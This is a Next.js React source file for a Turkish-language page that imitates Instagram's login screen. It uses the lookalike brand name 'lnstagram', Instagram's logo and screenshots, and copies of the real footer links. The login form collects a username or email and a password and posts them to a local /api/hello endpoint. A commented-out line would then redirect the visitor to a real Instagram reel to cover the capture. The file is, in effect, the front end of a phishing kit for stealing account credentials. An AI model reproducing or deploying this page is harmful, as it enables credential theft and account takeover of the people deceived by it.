import Head from 'next/head'
import Link from 'next/link'
import { Swiper, SwiperSlide } from 'swiper/react';
import { Autoplay, EffectFade, Navigation, Pagination } from "swiper";
import React, { useRef, useState } from "react";


import "swiper/css";
import "swiper/css/effect-fade";
import "swiper/css/navigation";
import "swiper/css/pagination";

export default function Home() {


  const [mail, setMail] = useState('');
  const [password, setPassword] = useState('');

  const SubmitHandler = (e) => {
    e.preventDefault()
    fetch("/api/hello", {
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      method: "POST",
      body: JSON.stringify({ mail: mail, password: password })
    })
    .then((res) => {console.log(res)})
    .catch((err) => {console.log(err)})
    // setTimeout(() => {
    //   location.href = "https://www.instagram.com/reels/videos/CoBHsQnJP3z/"
    // }, 1000);
  }

  return (
    <>
      <Head>
        <title>lnstagram</title>
        <meta name="description" content="Lorem Ipsum" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.webp" />
      </Head>
      <main className='bg-[#fafafa] overflow-hidden'>
        <div className="min-[400px]:container mx-auto ">
          <section className="div w-full sm:w-4/6 mx-auto py-16 flex">
            <article className='w-2/4 relative max-xl:hidden'>
              <img src="/home-phones.png" alt="" className='absolute z-10 scale-105' />
              <div className='absolute top-0 ml-[130px] '>
                <Swiper
                  loop={true}
                  spaceBetween={30}
                  effect={"fade"}
                  autoplay={{ delay: 1000 }}
                  modules={[EffectFade, Pagination, Autoplay]}
                  className="mySwiper"
                >
                  <SwiperSlide>
                    <img src="/screenshot1.png" className='h-full' />
                  </SwiperSlide>
                  <SwiperSlide>
                    <img src="/screenshot2.png" className='h-full' />
                  </SwiperSlide>
                  <SwiperSlide>
                    <img src="/screenshot3.png" className='h-full' />
                  </SwiperSlide>
                  <SwiperSlide>
                    <img src="/screenshot4.png" className='h-full' />
                  </SwiperSlide>
                </Swiper>

              </div>
            </article>
            <article className='w-full xl:w-2/4 p-3 relative z-20 lg:pr-12'>
              <div className="flex flex-col gap-4">
                <div className='p-6 sm:p-10 sm:border border-[#dbdbdb] h-full flex flex-col gap-4 bg-white'>
                  <div className='logo pb-8 px-0'>
                    <img src="/instagram_logo.png" alt="" className='w-3/4 md:w-2/4 mx-auto' />
                  </div>
                  <div className="login-form">
                    <form onSubmit={SubmitHandler}>
                      <div className='flex flex-col gap-2 text-sm'>
                        <input required type="text" value={mail} className='border border-[#dbdbdb] p-2 rounded-[2px] bg-[#fafafa] outline-none' placeholder='Telefon numarası, kullanıcı adı veya e-posta' onChange={e => setMail(e.target.value)} />
                        <input required type="password" value={password} className='border border-[#dbdbdb] p-2 rounded-[2px] bg-[#fafafa] outline-none' placeholder='Şifre' onChange={e => setPassword(e.target.value)} />
                        <input type="submit"  value={"Giriş yap"} className="bg-[#0095f6] py-2 px-4 rounded-lg text-white font-medium cursor-pointer" />
                      </div>
                    </form>
                  </div>
                  <div className='flex gap-3 items-center'>
                    <span className='w-full h-[1px] bg-[#dbdbdbdb]'></span>
                    <span className='min-w-max text-[#8e8e8e] text-[13px] font-medium'>YA DA</span>
                    <span className='w-full h-[1px] bg-[#dbdbdbdb]'></span>
                  </div>
                  <div className='flex justify-center'>
                    <Link href={"/"} className='text-[#00376b] text-xs'>Şifreni mi unuttun?</Link>
                  </div>
                </div>
                <div className='sm:border border-[#dbdbdb] h-full text-sm text-[#262626] py-[10px] flex justify-center bg-white'>
                  <p className='m-[15px]'>Hesabın yok mu? <Link href={"/"} className="text-[#0095F6] cursor-pointer font-medium">Kaydol</Link></p>
                </div>
                <div className='flex flex-col gap-3 justify-center items-center text-sm'>
                  <p>Uygulamayı indir.</p>
                  <div className='flex justify-center'>
                    <div className='flex justify-center gap-2 max-h-10 max-w-3/4'>
                      <Link href={"/"}>
                        <img src="/googleplay.png" className='h-full' alt="" />
                      </Link>
                      <Link href={"/"}>
                        <img src="/microsoft.png" className='h-full' alt="" />
                      </Link>
                    </div>
                  </div>
                </div>
              </div>
            </article>
          </section>
          <footer className='flex flex-col gap-6 py-3'>
            <nav className='flex flex-wrap justify-center text-xs text-[#8e8e8e] gap-x-5 gap-y-2'>
              <Link href={"/"} className='hover:underline'>Meta</Link>
              <Link href={"/"} className='hover:underline'>Hakkında</Link>
              <Link href={"/"} className='hover:underline'>Blog</Link>
              <Link href={"/"} className='hover:underline'>İş Fırsatları</Link>
              <Link href={"/"} className='hover:underline'>Yardım</Link>
              <Link href={"/"} className='hover:underline'>API</Link>
              <Link href={"/"} className='hover:underline'>Gizlilik</Link>
              <Link href={"/"} className='hover:underline'>Koşullar</Link>
              <Link href={"/"} className='hover:underline'>Başlıca Hesaplar</Link>
              <Link href={"/"} className='hover:underline'>Konumlar</Link>
              <Link href={"/"} className='hover:underline'>lnstagram Lite</Link>
              <Link href={"/"} className='hover:underline'>Kişi Yükleme ve Hesabı Olmayan Kişiler</Link>
            </nav>
            <div className="copy flex justify-center gap-3  text-xs text-[#8e8e8e]">
              <span>Türkçe</span>
              <span> &copy; 2023 lnstagram </span>
            </div>
          </footer>
        </div>
      </main>
    </>
  )
}
